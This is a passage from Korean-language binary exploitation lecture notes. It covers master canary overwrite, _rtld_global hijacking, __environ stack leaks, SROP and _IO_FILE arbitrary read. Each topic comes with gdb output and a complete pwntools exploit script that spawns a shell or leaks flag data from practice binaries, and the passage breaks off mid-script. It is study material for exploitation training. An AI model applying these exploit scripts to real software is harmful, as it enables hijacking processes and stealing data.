있다. 즉, \u0026ldquo;버퍼에서 self 까지의 거리\u0026rdquo; + 0x972 가 self-\u0026gt;canceltype 의 주소이다. vmmap 명령어로 실행파일을 분석하여 rw 권한이 모두 존재하는 영역의 주소를 찾는다. 프로그램 실행에 최대한 영향을 주지 않게 하기 위해 주소의 중간 영역을 임의로 골라 self-\u0026gt;canceltype 의 주소값이 rw 권한을 가질 수 있게 버퍼를 조정한다. ex) # payload 가 (rbp - 0x110) ~ ($fs_base + 0x28) 영역을 덮어쓰도록 구성한다.\rpayload = b\u0026#39;A\u0026#39;*0x910 # buffer ~ self 까지 거리\rpayload += p64(0x404800 - 0x972) # self-\u0026gt;canceltype 에 들어갈 주소 (rw권한 존재)\rpayload += b\u0026#39;C\u0026#39; * 0x10 # 남는영역 마저 채우기 ()\rpayload += p64(0x4141414141414141) # master canary 영역 return 주소에 exploit 을 위한 함수가 호출되도록 변경 ex) p = process(\u0026#39;./mc_thread2\u0026#39;)\relf = ELF(\u0026#39;./mc_thread\u0026#39;)\rpayload = b\u0026#39;A\u0026#39; * 264 # buffer ~ 지역변수 영역\rpayload += b\u0026#39;A\u0026#39; * 8 # canary\rpayload += b\u0026#39;B\u0026#39; * 8 # SFP\rpayload += p64(elf.symbols[\u0026#39;giveshell\u0026#39;]) # return address (exploit 을 위한 함수로 변경)\rpayload += b\u0026#39;C\u0026#39; * (0x910 - len(payload)) # master canary 영역을 변조시키기 위한 dummy\rpayload += p64(0x404800 - 0x972) # self-\u0026gt;canceltype 를 적용 할 때 발생하는 SIGSEGV 를 없애기 위한 처리\rpayload += b\u0026#39;C\u0026#39; * 0x10 # 나머지 영역 dummy 로 채우기\rpayload += p64(0x4141414141414141) # master canary 변조\rp.sendafter(b\u0026#39;Data: \u0026#39;, payload)\rp.interactive() Overwrite _rtld_global glibc 라이브러리를 포함하여 컴파일 한 프로그램은 실행시 __libc_start_main 가 호출된다. __libc_start_main는 main 함수를 호출한다. main함수가 종료되면 __GI_exit 함수가 호출된다. __GI_exit 함수는 __run_exit_handlers 함수를 호출한다. __run_exit_handlers 함수에서는 exit_function 구조체의 fns 인자를 호출하는데, 이는 _dl_fini 를 호출하게 되어있다. _dl_fini 함수는 _dl_load_lock 을 인자로 dl_rtld_lock_recursive 함수를 호출한다. _dl_load_lock 은 _rtld_global 구조체의 멤버 변수이다. dl_rtld_lock_recursive 함수도 _rtld_global 구조체의 멤버 변수이다. glibc 2.27 기준, _rtld_global 구조체의 dl_rtld_lock_recursive 포인터 가 저장된 메모리는 읽기/쓰기 권한이 모두 부여되어 있기 때문에 이 함수를 덮어써서 exploit 을 수행 할 수 있다. 쓰기 권한을 부여한 이유는 dl_main 함수에서 _rtld_global 구조체의 dl_rtld_lock_recursive 영역을 초기화 할 수 있게 하기 위함이었다. _rtld_global 구조체의 주소를 확인하고, _dl_load_lock 과 dl_rtld_lock_recursive 의 포인터를 덮어 써서 exploit 을 할 수 있다. exploit 예시 전제조건 : 실행중 라이브러리 함수 혹은 변수의 주소를 획득 할 수 있어야 한다. (예시 코드에서는 stdout 코드를 일부러 출력 해 준다.) ex) printf(\u0026quot;stdout: %p\\n\u0026quot;, stdout); 특정 주소에 데이터를 주입하는 구문이 존재한다. ex) printf(\u0026#34;addr: \u0026#34;);\rscanf(\u0026#34;%ld\u0026#34;, \u0026amp;addr); // 주소 입력\rprintf(\u0026#34;data: \u0026#34;);\rscanf(\u0026#34;%ld\u0026#34;, \u0026amp;data); // 데이터 팁력\r*(long long *)addr = data; // 주소가 가리키는 값에 데이터 저장 exploit 방법 : exploit 대상 시스템이 사용하는 라이브러리 파일을 준비한다.\nldd 명령으로 라이브러리 의존성을 확인한다. linux-vdso.so.1 (0x00007fff96777000)\rlibc.so.6 =\u0026gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcdb0aa5000)\r/lib64/ld-linux-x86-64.so.2 (0x00007fcdb1098000) patchelf 도구를 사용하여 ld 및 libc 라이브러리 의존성을 변경한다. patchelf --set-interpreter {라이브러리} {실행파일} 명령으로 실행파일에 적용될 라이브러리를 변경 가능하다. (ld 라이브러리 적용) export LD_PRELOAD=$(realpath {라이브러리_파일}) 명령으로 라이브러리 파일의 참조 위치도 변경한다. (libc 라이브러리 적용) 실행 파일에서 libc 라이브러리의 offset을 구한다.\n코드에서 stdout 을 호출했으므로, libc 파일이 로드 되었을 것이다. .bss 영역에 libc 영역이 포함되고, gdb 에서 vmmap 명령으로 libc* 형태의 파일이 처음 시작하는 offset을 추출할 수 있다. 0x7ffff79e4000 0x7ffff7bcb000 r-xp 1e7000 0 /lib/x86_64-linux-gnu/libc-2.27.so ld 라이브러리의 base offset을 구한다.\n마찬가지로 gdb 에서 vmmap 명령으로 ld* 파일의 시작 offset을 찾는다. 0x7ffff7dd5000 0x7ffff7dfc000 r-xp 27000 0 /volume/pwn/lecture/rtld_global/ld-2.27.so _rtld_global 구조체 멤버들의 offset을 확인한다.\nlibc 라이브러리 파일을 실행시켜서 버전을 확인한다. $ ./libc-2.27.so\rGNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.\rCopyright (C) 2018 Free Software Foundation, Inc.\rThis is free software; see the source for copying conditions.\rThere is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A\rPARTICULAR PURPOSE.\rCompiled by GNU CC version 7.3.0.\rlibc ABIs: UNIQUE IFUNC\rFor bug reporting instructions, please see:\r\u0026lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs\u0026gt;. \u0026ldquo;2.27-3ubuntu1\u0026rdquo; 구문이 libc 의 상세 버전인데, 해당 버전의 debug package 를 획득항혀야 한다. 구글에 검색하여 획득 하면 된다. (https://launchpad.net/ubuntu/bionic/amd64/libc6-dbg/2.27-3ubuntu1) or (http://launchpadlibrarian.net/365856914/libc6-dbg_2.27-3ubuntu1_amd64.deb) 획득한 .deb 파일을 dpkg -x 명령으로 압축을 해제한 후, 압축 해제된 usr/lib/debug/lib/x86_64-linux-gnu/ld-2.27.so 파일을 gdb로 실행한다. _rtld_global 구조체의 멤버 변수 _dl_load_lock, _dl_rtld_lock_recursive 가 필요하므로 아래와 같이 두 변수의 주소를 확인한다. pwndbg\u0026gt; p \u0026amp;_rtld_global._dl_load_lock\r$1 = (__rtld_lock_recursive_t *) 0x228968 \u0026lt;_rtld_local+2312\u0026gt;\rpwndbg\u0026gt; p \u0026amp;_rtld_global._dl_rtld_lock_recursive\r$2 = (void (**)(void *)) 0x228f60 \u0026lt;_rtld_local+3840\u0026gt; exploit 코드를 작성한다.\nlibc_base 의 offset 을 구한다. libc 파일의 ELF에서 _IO_2_1_stdout_ 심볼로 획득 가능하다. libc_base 와 ld_base 의 offset 차이를 이용해 ld_base의 주소를 구한다. 2,3번 과정에서 구한 주소를 서로 빼서 간격을 구한다. (예시에서는 0x3f1000 만큼 차이가 난다.) _rtld_global 의 주소를 구한다. ld 파일의 ELF에서 _rtld_global 심볼로 offset 을 획득하고, ld_base 주소를 더해 _rtld_global 의 실제 주소를 구한다. 4에서 구한 _rtld_global 구조체의 멤버변수 _dl_load_lock, _dl_rtld_lock_recursive 의 offset 을 _rtld_global 주소에 더해 각 변수가 메모리에 적재된 주소를 구한다. exploit 을 위해 _dl_rtld_lock_recursive 변수를 libc 라이브러리의 system 함수로 덮어쓰고, dl_load_lock 를 \u0026ldquo;sh\u0026rdquo; 로 치환한다. 앞서 Overwrite _rtld_global 에서 살펴보았듯, main 함수가 종료될 때 _dl_rtld_lock_recursive(dl_load_lock) 형태로 함수가 호출되는 점을 이용한 것 최종 코드 #!/usr/bin/env python3\rfrom pwn import *\rp = process(\u0026#39;./ow_rtld\u0026#39;, env= {\u0026#34;LD_PRELOAD\u0026#34; : \u0026#34;./libc-2.27.so\u0026#34;}) # {\u0026#34;LD_LIBRARY_PATH\u0026#34; : \u0026#34;.\u0026#34;} 구문으로도 가능\rlibc = ELF(\u0026#39;./libc-2.27.so\u0026#39;)\rld = ELF(\u0026#39;./ld-2.27.so\u0026#39;)\r# gdb를 통해 획득한 정보\rLIBC_BASE_OFFSET = 0x3f1000\rDL_LOAD_LOCK_OFFSET_FROM_RTLD_GLOBAL = 2312\rDL_RTLD_LOCK_RECURSIVE_OFFSET_FROM_RTLD_GLOBAL = 3840\r# exploit 코드\rp.recvuntil(b\u0026#39;: \u0026#39;)\rstdout = int(p.recvuntil(b\u0026#39;\\n\u0026#39;), 16) # stdout 변수의 주소 획득\rlibc_base = stdout - libc.symbols[\u0026#39;_IO_2_1_stdout_\u0026#39;] # libc_base 주소 획득\rld_base = libc_base + 0x3f1000 # ld_base 주소 계산\rprint(\u0026#39;libc_base:\u0026#39;, hex(libc_base))\rprint(\u0026#39;ld_base:\u0026#39;, hex(ld_base))\rrtld_global = ld_base + ld.symbols[\u0026#39;_rtld_global\u0026#39;] # _rtld_global 주소 획득\rdl_load_lock = rtld_global + DL_LOAD_LOCK_OFFSET_FROM_RTLD_GLOBAL # _dl_load_lock 주소 계산\rdl_rtld_lock_recursive = rtld_global + DL_RTLD_LOCK_RECURSIVE_OFFSET_FROM_RTLD_GLOBAL # _dl_rtld_lock_recursive 주소 \u0026gt;계산\rprint(\u0026#39;rtld_global:\u0026#39;, hex(rtld_global))\rprint(\u0026#39;dl_load_lock:\u0026#39;, hex(dl_load_lock))\rprint(\u0026#39;dl_rtld_lock_recursive:\u0026#39;, hex(dl_rtld_lock_recursive))\rsystem = libc_base + libc.symbols[\u0026#39;system\u0026#39;] # system 함수의 주소 획득\rprint(\u0026#39;system:\u0026#39;, hex(system))\r# _dl_rtld_lock_recursive 주소에 system 함수 덮어쓰기\rp.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;)\rp.sendlineafter(b\u0026#39;addr: \u0026#39;, str(dl_rtld_lock_recursive).encode())\rp.sendlineafter(b\u0026#39;data: \u0026#39;, str(system).encode())\r# dl_load_lock 주소에 \u0026#34;/bin/sh\u0026#34; 문자열 덮어쓰기\rp.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;)\rp.sendlineafter(b\u0026#39;addr: \u0026#39;, str(dl_load_lock).encode())\rp.sendlineafter(b\u0026#39;data: \u0026#39;, str(u64(\u0026#39;/bin/sh\\x00\u0026#39;)).encode())\r# main 함수 종료\rp.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;2\u0026#39;)\rp.interactive() __environ 환경변수는 동적인 값들의 모임으로 시스템의 동작에 관한 정보를 저장하는 변수이다. 환경변수는 사용자에 의해 수정 및 삭제가 가능하다. 프로그램도 실행 시 환경변수를 참조한다. 프로그램을 실행시키면 스택 영역에 환경변수 정보가 탑재된다. 라이브러리 함수도 스택 영역의 환경변수를 참조하기 때문에, 이를 이용하면 환경변수가 존재하는 스택 영역의 주소를 추출 할 수 있다. execve, getenv 등의 함수가 환경변수를 참조한다. libc.so 파일의 elf 를 분석하면 __environ 이라는 변수가 존재한다. $ readelf -s ./libc.so.6 | grep \u0026#34;environ\u0026#34;\r133: 0000000000221200 8 OBJECT WEAK DEFAULT 35 _environ@@GLIBC_2.2.5\r724: 0000000000221200 8 OBJECT GLOBAL DEFAULT 35 __environ@@GLIBC_2.2.5\r958: 0000000000221200 8 OBJECT WEAK DEFAULT 35 environ@@GLIBC_2.2.5 gdb 에서 __environ 변수를 확인 해 보면 stack 영역에 자리잡고 있음을 알 수 있다. pwndbg\u0026gt; x/g __environ\r0x7fffffffe6c8: 0x00007fffffffe8cb\rpwndbg\u0026gt; vmmap 0x00007fffffffe6c8\rLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\rStart End Perm Size Offset File\r0x7ffffffde000 0x7ffffffff000 rw-p 21000 0 [stack] +0x206c8 exploit 예시 전제조건:\nstdout 변수의 주소값을 알 수 있다. (예시에서는 일부러 출력해 줌) 탈취할 파일을 프로그램에서 읽어서 버퍼에 저장한다. 임의 주소 읽기 취약점이 존재한다. scanf(\u0026#34;%ld\u0026#34;, \u0026amp;addr);\rprintf(\u0026#34;%s\u0026#34;, (char *)addr); -\u0026gt; 임의 주소 읽기로 정보 탈취 가능 exploit 방법:\nlibc_base 의 주소를 계산한다.\nstdout 포인터의 주소값과 offset 값을 비교하여 libc_base 의 주소값을 구한다. __environ 변수의 주소값을 구한다.\nlibc_base 주소값에서 __environ 변수의 offset 을 더하여 구한다. 탈취할 데이터가 저장된 주소를 계산한다.\n프로그램에서 read 함수를 이용해 데이터를 읽어 오므로, read 함수 호출시 RCX 레지스터의 주소를 확인하면 데이터가 저장되는 값의 주소를 알 수 있다. gdb 를 통해 read 함수 호출 당시 RCX 레지스터의 주소를 확인하고, 이를 __environ 변수의 주소와 비교하여 offset 을 구한다. 0x555555400a21 \u0026lt;read_file+43\u0026gt; call open@plt \u0026lt;open@plt\u0026gt;\r0x555555400a26 \u0026lt;read_file+48\u0026gt; mov dword ptr [rbp - 0x1014], eax\r0x555555400a2c \u0026lt;read_file+54\u0026gt; lea rcx, [rbp - 0x1010]\r► 0x555555400a33 \u0026lt;read_file+61\u0026gt; mov eax, dword ptr [rbp - 0x1014]\r0x555555400a39 \u0026lt;read_file+67\u0026gt; mov edx, 0xfff\r0x555555400a3e \u0026lt;read_file+72\u0026gt; mov rsi, rcx\r0x555555400a41 \u0026lt;read_file+75\u0026gt; mov edi, eax\r0x555555400a43 \u0026lt;read_file+77\u0026gt; call read@plt \u0026lt;read@plt\u0026gt;\r...\rpwndbg\u0026gt; x/g $rcx\r0x7fffffffd190: 0\rpwndbg\u0026gt; x/g $rcx\r0x7fffffffd190: 0\rpwndbg\u0026gt; p/x 0x7fffffffe6c8 - 0x7fffffffd190\r$1 = 0x1538 예시에서는 offset 이 0x1538이다. 추출한 주소에 저장된 값을 임의 주소 읽기 취약점으로 획득한다.\n전체 코드\n#!/usr/bin/env python3\rfrom pwn import *\rp = process(\u0026#39;./environ\u0026#39;)\relf = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;)\r# GDB를 통해 확인한 정보\rOFFSET_FROM_ENVIRON_TO_BUFFER = 0x1538\rp.recvuntil(b\u0026#39;stdout: \u0026#39;)\rstdout = int(p.recvuntil(b\u0026#39;\\n\u0026#39;), 16) # stdout 주소 획득(편의를 위해 예시에서 제공)\rlibc_base = stdout - elf.symbols[\u0026#39;_IO_2_1_stdout_\u0026#39;] # libc_base 주소 계산\rlibc_environ = libc_base + elf.symbols[\u0026#39;__environ\u0026#39;] # __environ 변수 주소 계산\rprint(\u0026#39;libc_base:\u0026#39;, hex(libc_base))\rprint(\u0026#39;libc_environ:\u0026#39;, hex(libc_environ))\r# 임의 주소 읽기를 위한 값 입력\rp.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;)\rprint(\u0026#39;encoded libc_environ:\u0026#39;, str(libc_environ).encode())\rp.sendlineafter(b\u0026#39;Addr: \u0026#39;, str(libc_environ).encode()) # __environ 변수가 가리키는 값 출력 유도\rstack_environ = p.recv(6)\rprint(\u0026#39;raw stack_environ:\u0026#39;, stack_environ)\rstack_environ = u64(stack_environ.ljust(8, b\u0026#39;\\x00\u0026#39;)) # printf(\u0026#34;%s\u0026#34;, (char *)addr); 에서 전달된 값 파\u0026gt;싱\r# stack_environ 은 __environ 변수가 가리키는 stack 의 주소\rprint(\u0026#39;stack_environ:\u0026#39;, hex(stack_environ))\rfile_content = stack_environ - OFFSET_FROM_ENVIRON_TO_BUFFER # 데이터가 저장된 stack 주소 계산\rprint(\u0026#39;file_content:\u0026#39;, hex(file_content))\r# 임의 주소 읽기를 위한 값 입력\rp.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;)\rp.sendlineafter(b\u0026#39;:\u0026#39;, str(file_content).encode()) # 최종적으로 원하는 값 획득\rp.interactive() SigReturn-Oriented Programming (SROP) 운영체제는 User Mode 와 Kernel Mode 가 존재하고, 각 모드에서 수행할 수 있는 동작의 제약이 다르다.\n시그널이 발생하면 시그널에 해당하는 코드가 Kernel Mode 에서 실행되고, 다시 Usesr Mode 로 시스템의 흐름이 전환된다.\nKernel Mode 에서 User Mode 로 전환되기 위해서는 Signal 이 발생한 시점의 프로그램 정보(레지스터, 메모리, 등) 가 기록되어야 한다.\nSignal 이 발생하면 arch_do_signal_or_restart 함수가 호출된다. 함수 이름은 Linux 버전에 따라 상이할 수 있다.\ndo_signal(Linux 5.8 이하) arch_do_signal(Linux 5.10 이하) arch_do_signal_or_restart(Linux 5.10 초과) arch_do_signal_or_restart 함수는 get_signal 을 호춣하고, signal handler 가 등록되어 있다면 handle_signal -\u0026gt; setup_rt_frame -\u0026gt; signal_setup_done 을 차례로 호출한다.\nsetup_rt_frame 함수는 setup_rt_frame(ksig, regs) 형태로 호출되는데, regs-\u0026gt;si, regs-\u0026gt;dx, regs-\u0026gt;ip, regs-\u0026gt;sp 에 알맞은 값을 집어넣어 등록한 signal handler 함수가 호출될 수 있도록 설정한다. Kernel Mode 에서 User Mode 로 context switching 을 하기 위해서는 signal을 처리하기 전에 sigreturn 시스템 콜을 호출하여 당시 프로그램 정보를 기록한다.\nsigreturn 이 호출되면 restore_sigcontext 함수에서 현재 스택의 값을 레지스터에 복제한다. 이렇게 기록된 값을 사용하여 signal 발생 직전의 상태로 context switching 을 수행할 수 있다.\nsigcontext 구조체에 있는 각 멤머 변수에 데이터를 삽입하는데, 이는 레지스터에 데이터를 집어넣는 것이라 보면 된다. SROP 란, 위에서 설명한 sigreturn 시스템 콜을 사용한 ROP (Return Oriented Programming) 기법으로, 스택에 임의의 값을 미리 채워놓고, sigreturn 호출을 유도한 이후 User Mode 로 context switching 될 때 원하는 함수가 실행되도록 하는 exploit 방법이다.\nexploit 예시 buffer overflow를 이용하여 sigreturn 이 호출되도록 gadget 을 주입한다.\nsigreturn 시스템콜은 15번 system call 이기 때문에, stack overflow 를 발생시켜 RIP 레지스터에 pop rax; syscall; ret 가젯을 집어넣고, RAX 레지스터를 15 로 변경하면, 함수 stack 이 종료될 때 sigreturn 시스템 콜이 호출된다. \u0026ldquo;/bin/bash\u0026rdquo; 문자열을 주입하기 위해 sigreturn 으로 read(0, bss, 0x1000) 를 먼저 호출한다.\nbss 에 저장된 데이터를 활용하여 sigreturn를 한번 더 호출해 execve(\u0026quot;/bin/bash\u0026quot;) 구문이 실행되도록 한다.\n전체 코드 from pwn import *\rcontext.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;]\rcontext.arch = \u0026#39;x86_64\u0026#39;\rp = process(\u0026#39;srop\u0026#39;)\relf = ELF(\u0026#39;./srop\u0026#39;)\rgadget = next(elf.search(asm(\u0026#39;pop rax; syscall\u0026#39;))) # 코드상에 있는 내용 사용한 것\rprint(\u0026#39;gadget:\u0026#39;, hex(gadget))\rpayload = b\u0026#39;A\u0026#39;*16 # BUFFER overflow\rpayload += b\u0026#39;B\u0026#39;*8 # SFP\rpayload += p64(gadget) # return address\rpayload += p64(15) # sigreturn, pop rax 동작으로 rax에 채워질 값\r# read(0, bss, 0x1000) 에 해당하는 gadget 생성, 충분한 길이를 위해 0x1000 byte read\r# read를 한번 더 수행해서 \u0026#34;/bin/bash\u0026#34; string 을 bss 영역에 입력하기 위해 gadget 세팅\rbss = elf.bss()\rsyscall = next(elf.search(asm(\u0026#39;syscall\u0026#39;)))\rframe = SigreturnFrame()\rframe.rdi = 0 # argv1\rframe.rsi = bss # argv2\rframe.rdx = 0x1000 # argv3\rframe.rax = 0 # SYS_read\rframe.rip = syscall # syscall 명령어 실행\rframe.rsp = bss # stack 주소를 bss 위치로 변경\rpayload += bytes(frame) # sigcontext 값 주입\rp.sendline(payload) # overflow 유발\r# execve(\u0026#39;/bin/sh\u0026#39;, 0, 0) 에 해당하는 gadget 생성\rframe2 = SigreturnFrame()\r# frame2.rdi = bss + ? # argv1, \u0026#39;/bin/sh\u0026#39; 가 담긴 위치를 넣어야 한다.\r# rsi, rdx는 default 로 0\rframe2.rip = syscall # syscall 명령어 실행\rframe2.rax = 0x3b # execve 번호\rframe2.rsp = bss + 0x500 # 충분한 버퍼를 두고 stack의 top을 bss 위치로 이동\rrop = p64(gadget) # sigreturn 호출하기 위한 gadget\rrop += p64(15) # RAX로 pop 될 위치에 sigreturn 번호 주입\rframe2.rdi = bss + len(frame2) + len(rop) # bss + 0x108, argv1, \u0026#39;/bin/sh\u0026#39; 가 담긴 위치.\rprint(\u0026#39;rdi:\u0026#39;, bss, \u0026#39;+\u0026#39;, len(frame2) + len(rop))\rrop += bytes(frame2) # sigcontext 값 주입\rrop += b\u0026#39;/bin/sh\\x00\u0026#39;\rp.sendline(rop) # 호출된 reaed(0, bss, 0x1000) 함수에 의한 입력값 입력\rp.interactive() _IO_FILE fopen 으로 파일을 열면 파일의 모드(read, write, \u0026hellip;), 파일 작업을 위한 함수의 주소 등을 파일 포인터(FILE *)로 전달받는다. 표준 라이브러리의 FILE 구조체는 은 typedef struct IO_FILE FILE 구문에 의해 정의된 것이며, 리눅스에서 fopen 함수를 호출하면 힙 영역에 _IO_FILE 구조체가 할당된다. _IO_FILE 구조체 형태 struct _IO_FILE\r{\rint _flags;\t/* 파일에 대한 읽기/쓰기/추가 권한. 0xfbad0000 값(_IO_MAGIC)을 매직 값으로, 하위 2바이트는 비트 플래그로 사용 */ char *_IO_read_ptr;\t/* 파일 읽기 버퍼 포인터 */\rchar *_IO_read_end;\t/* 파일 읽기 버퍼 주소의 끝 포인터 */\rchar *_IO_read_base;\t/* 파일 읽기 버퍼 주소의 시작 포인터 */\rchar *_IO_write_base;\t/* 파일 쓰기 버퍼에 대한 시작 포인터 */\rchar *_IO_write_ptr;\t/* 파일 쓰기 버퍼 포인터 */\rchar *_IO_write_end;\t/* 파일 쓰기 버퍼 주소의 끝 포인터 */\rchar *_IO_buf_base;\t/* Start of reserve area */\rchar *_IO_buf_end;\t/* End of reserve area. */\r/* The following fields are used to support backing up and undo. */\rchar *_IO_save_base; /* Pointer to start of non-current get area. */\rchar *_IO_backup_base; /* Pointer to first valid character of backup area */\rchar *_IO_save_end; /* Pointer to end of non-current get area. */\rstruct _IO_marker *_markers;\rstruct _IO_FILE *_chain;\rint _fileno; /* 파일 디스크립터 값 */\rint _flags2;\r__off_t _old_offset; /* This used to be _offset but it\u0026#39;s too small. */\r/* 1+column number of pbase(); 0 is unknown. */\runsigned short _cur_column;\rsigned char _vtable_offset;\rchar _shortbuf[1];\r_IO_lock_t *_lock;\r/* _IO_USE_OLD_IO_FILE 가 정의되어있다면 여기까지만 사용 */\r__off64_t _offset;\r/* Wide character stream stuff. */\rstruct _IO_codecvt *_codecvt;\rstruct _IO_wide_data *_wide_data;\rstruct _IO_FILE *_freeres_list;\rvoid *_freeres_buf;\rsize_t __pad5;\rint _mode;\r/* Make sure we don\u0026#39;t get into trouble again. */\rchar _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];\r}; fopen 함수를 호출하면 _IO_new_file_fopen 에서 mode 인자의 값이 \u0026lsquo;r\u0026rsquo;, \u0026lsquo;w\u0026rsquo;, \u0026lsquo;a\u0026rsquo; 중 어느 것인지 확인하고 flag 에 비트를 할당한다. flag 종류 #define _IO_MAGIC 0xFBAD0000 /* Magic number */\r#define _IO_MAGIC_MASK 0xFFFF0000\r#define _IO_USER_BUF 0x0001 /* Don\u0026#39;t deallocate buffer on close. */\r#define _IO_UNBUFFERED 0x0002\r#define _IO_NO_READS 0x0004 /* Reading not allowed. */\r#define _IO_NO_WRITES 0x0008 /* Writing not allowed. */\r#define _IO_EOF_SEEN 0x0010\r#define _IO_ERR_SEEN 0x0020\r#define _IO_DELETE_DONT_CLOSE 0x0040 /* Don\u0026#39;t call close(_fileno) on close. */\r#define _IO_LINKED 0x0080 /* In the list of all open files. */\r#define _IO_IN_BACKUP 0x0100\r#define _IO_LINE_BUF 0x0200\r#define _IO_TIED_PUT_GET 0x0400 /* Put and get pointer move in unison. */\r#define _IO_CURRENTLY_PUTTING 0x0800\r#define _IO_IS_APPENDING 0x1000\r#define _IO_IS_FILEBUF 0x2000 /* 0x4000 No longer used, reserved for compat. */\r#define _IO_USER_LOCK 0x8000 _IO_FILE 구조체를 담고있는 _IO_FILE_plus 구조체에는 _IO_jump_t *vtable 포인터가 있는데, 이 포인터에 파일 처리 관련 동작을 수행하는 함수의 주소가 연결된다. _IO_FILE_plus 형태 struct _IO_FILE_plus\r{\rFILE file;\rconst struct _IO_jump_t *vtable;\r}; 모든 파일 관련 함수는 vtable 에 의해 호출된다. # 64bit 운영체제 기준 크기\rstruct _IO_jump_t\r{\rJUMP_FIELD(size_t, __dummy); # 8byte\rJUMP_FIELD(size_t, __dummy2); # 8byte\rJUMP_FIELD(_IO_finish_t, __finish); # 8byte\rJUMP_FIELD(_IO_overflow_t, __overflow); # 8byte\rJUMP_FIELD(_IO_underflow_t, __underflow); # 8byte\rJUMP_FIELD(_IO_underflow_t, __uflow); # 8byte\rJUMP_FIELD(_IO_pbackfail_t, __pbackfail); # 8byte\r/* showmany */\rJUMP_FIELD(_IO_xsputn_t, __xsputn); # 8byte\rJUMP_FIELD(_IO_xsgetn_t, __xsgetn); # 8byte\rJUMP_FIELD(_IO_seekoff_t, __seekoff); # 8byte\rJUMP_FIELD(_IO_seekpos_t, __seekpos); # 8byte\rJUMP_FIELD(_IO_setbuf_t, __setbuf); # 8byte\rJUMP_FIELD(_IO_sync_t, __sync); # 8byte\rJUMP_FIELD(_IO_doallocate_t, __doallocate); # 8byte\rJUMP_FIELD(_IO_read_t, __read); # 8byte\rJUMP_FIELD(_IO_write_t, __write); # 8byte\rJUMP_FIELD(_IO_seek_t, __seek); # 8byte\rJUMP_FIELD(_IO_close_t, __close); # 8byte\rJUMP_FIELD(_IO_stat_t, __stat); # 8byte\rJUMP_FIELD(_IO_showmanyc_t, __showmanyc); # 8byte\rJUMP_FIELD(_IO_imbue_t, __imbue); # 8byte\r}; vtable 에 연결된 함수들은 모두 동적으로 할당되는 함수들이기 때문에 공격에 악용될 수 있다. 파일 관련 함수 중, 파일을 수정할 때 사용되는 fwrite , fputs 등은 내부적으로 _IO_sputn 함수를 호출하게 된다. _IO_sputn -\u0026gt; _IO_XSPUTN-\u0026gt; _IO_new_file_xsputn -\u0026gt; _IO_OVERFLOW 순서로 함수가 호출되며, 최종적으로 _IO_new_file_overflow 가 호출된다. _IO_new_file_overflow 에서는 아래 과정을 거쳐 함수 구조체에 값을 집어넣게 된다. if (f-\u0026gt;_flags \u0026amp; _IO_NO_WRITES) : 조건을 만족하면 EOF 반환후 종료 if ((f-\u0026gt;_flags \u0026amp; _IO_CURRENTLY_PUTTING) == 0 || f-\u0026gt;_IO_write_base == NULL) : f-\u0026gt;_IO_write_ptr, f-\u0026gt;_IO_write_base, f-\u0026gt;_IO_write_end, f-\u0026gt;_IO_read_base 등 파일 포인터 함수들을 설정 인자로 받은 파일 구조체(_IO_FILE)에서 _flags 를 확인하여 쓰기 권한(_IO_CURRENTLY_PUTTING)이 없다면 _IO_write_ptr, _IO_write_base, IO_write_end 등의 값을 다른 값으로 치환한다. 쓰기 권한이 있다면, 파일 구조체를 인자로 _IO_do_write -\u0026gt; new_do_write 을 호출하고, _flags 에서 append 권한(_IO_IS_APPENDING) 을 확인한 후 _IO_SYSWRITE 을 호출하게 되는데, 이 _IO_SYSWRITE 함수가 vtable 의 _IO_new_file_write 가 가키리는 함수이다. _IO_new_file_write 에 전달되는 파일 구조체를 \u0026lsquo;f\u0026rsquo; 라 하면, write(f-\u0026gt;_fileno, _IO_write_base, _IO_write_ptr - _IO_write_base); 구문으로 파일에 데이터를 작성한다. exploit 예시 전제조건 파일 포인터의 값을 덮어쓸 수 있어야 한다. 예제에서는 일부러 파일 포인터의 주소에 read를 하는 구문이 들어있다. (read(0, fp, 300);) 위에서 덮어쓴 파일 포인터를 이용한 파일 쓰기 구문을 수행한다. \u0026ldquo;char[1024] flag_buf\u0026rdquo; 변수에 데이터가 담겨있다. 방법 fwrite 함수를 이용하여 \u0026ldquo;flag_buf\u0026rdquo; 에 담긴 데이터를 표준 출력에 출력하도록 한다. (fwrite(data, sizeof(char), sizeof(flag_buf), fp);) 파일 구조체의 _flag 변수에 에 magic number 0xfbad0000 와 _IO_CURRENTLY_PUTTING (0x800) 을 세팅하여 _IO_new_file_overflow 함수에서 부수적인 작업 없이 _IO_do_write 가 호출될 수 있도록 설정한다. 프로그램 실행 중 원하는 주소의 값을 읽을 수 있도록 파일 구조체의 값을 세팅한다. _IO_do_write 는 최종적으로 write(f-\u0026gt;_fileno, _IO_write_base, _IO_write_ptr - _IO_write_base); 형태로 표현된다. _IO_write_base 를 추출하려는 데이터가 담긴 버퍼의 주소로 변경한다. _IO_write_ptr 를 추출하려는 데이터가 담긴 버퍼의 크기로 변경한다. _fileno 를 stdout 을 의미하는 1로 변환한다. pwntools 코드 예제 from pwn import *\rp = process(\u0026#39;./iofile_aar\u0026#39;)\relf = ELF(\u0026#39;./iofile_aar\u0026#39;)\rflag_buf = elf.symbols[\u0026#39;flag_buf\u0026#39;] # flag 데이터가 담긴 변수\rpayload = p64(0xfbad0000 | 0x800) # 파일 구조체 _flag 변수 설정 (magic number + _IO_CURRENTLY_PUTTING)\rpayload += p64(0) # _IO_read_ptr, 미사용\rpayload += p64(flag_buf) # _IO_read_end, 미사용\rpayload += p64(0) # _IO_read_base, 미사용\rpayload += p64(flag_buf) # _IO_write_base, flag 데이터가 담긴 변수의 주소\rpayload += p64(flag_buf + 1024) # _IO_write_ptr, flag 데이터가 담긴 변수의 주소 + 크기\rpayload += p64(0) # _IO_write_end, 미사용\rpayload += p64(0) 